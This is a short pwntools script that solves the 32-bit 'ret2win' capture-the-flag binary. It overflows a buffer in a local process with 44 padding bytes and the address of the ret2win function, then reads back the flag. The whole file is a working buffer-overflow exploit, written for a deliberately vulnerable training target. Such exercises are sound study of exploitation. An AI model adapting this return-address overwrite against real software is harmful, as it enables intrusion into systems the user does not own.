from pwn import *

X32_PADDING = 44

elf = context.binary = ELF("ret2win32")

ret2win_func = p32(elf.symbols.ret2win)

payload = b"\x90" * X32_PADDING + ret2win_func
info(f"payload: {payload}")

io = process(elf.path)
io.recvuntil(">")
io.sendline(payload)
# Get our flag!
flag = io.recvall()
success(flag)

